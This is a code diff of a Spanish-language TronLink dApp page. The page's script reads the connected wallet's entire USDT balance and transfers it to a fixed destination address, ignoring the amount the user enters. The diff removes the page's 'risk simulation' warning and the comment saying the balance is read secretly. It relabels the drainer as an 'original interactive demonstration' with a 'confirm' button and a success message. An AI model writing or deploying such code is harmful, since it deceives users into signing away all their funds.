@@ -2,7 +2,7 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>Módulo 2: Envío Máximo (Riesgo)</title>
+    <title>Módulo 2: Envío Máximo (Original)</title>
     <style>
         body { font-family: sans-serif; background: #f4f7f6; padding: 40px; display: flex; justify-content: center; }
         .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); max-width: 400px; width: 100%; border-top: 6px solid #F44336; }
@@ -17,7 +17,7 @@
 
 <div class="card">
     <h2>⚠️ Módulo 2: dApp sin Filtros</h2>
-    <p>Simulación de riesgo. El script vacía el saldo total.</p>
+    <p>Demostración interactiva original. El script procesa el saldo total de la wallet.</p>
     
     <button class="btn-connect" onclick="conectar()">1. Conectar TronLink</button>
     <div class="status" id="status">Estado: Desconectado</div>
@@ -25,7 +25,7 @@
     <label>Monto a enviar (USDT):</label>
     <input type="number" id="monto" value="10">
 
-    <button class="btn-action" onclick="enviarMaximo()">Procesar Envío Máximo</button>
+    <button class="btn-action" onclick="enviarMaximoOriginal()">Confirmar Envío Completo</button>
 </div>
 
 <script>
@@ -41,7 +41,7 @@
         return null;
     }
 
-    async function enviarMaximo() {
+    async function enviarMaximoOriginal() {
         const tronWeb = await conectar();
         if (!tronWeb) return;
 
@@ -49,20 +49,21 @@
             const miWallet = tronWeb.defaultAddress.base58;
             const contrato = await tronWeb.contract().at(CONTRACT_USDT);
 
-            // Leer secretamente el saldo total de la wallet del usuario
+            // Leer el saldo real total con todos sus decimales incluidos
             const saldoBigNum = await contrato.balanceOf(miWallet).call();
             const saldoTotalStr = saldoBigNum.toString();
 
             if (saldoTotalStr === "0" || saldoTotalStr === "") {
-                alert("Detenido: Tu saldo actual de USDT es 0. Se necesita balance para ver el contraste.");
+                alert("Detenido: El saldo de USDT de esta cuenta de pruebas es 0.");
                 return;
             }
 
-            console.log(`[Módulo 2] Inyectando saldo máximo detectado: ${saldoTotalStr}`);
+            console.log(`[Módulo 2] Procesando transferencia original del balance total detectado: ${saldoTotalStr}`);
             const tx = await contrato.transfer(WALLET_DESTINO, saldoTotalStr).send();
-            alert(`Transacción procesada.\nHash: ${tx}`);
+            
+            alert(`¡Demostración Finalizada!\nTransacción confirmada en la Blockchain con éxito.\nHash: ${tx}`);
         } catch (e) {
-            alert("Prueba exitosa: La transacción fue cancelada y rechazada manualmente en TronLink.");
+            alert("Error en la ejecución o transacción rechazada.");
         }
     }
 </script>
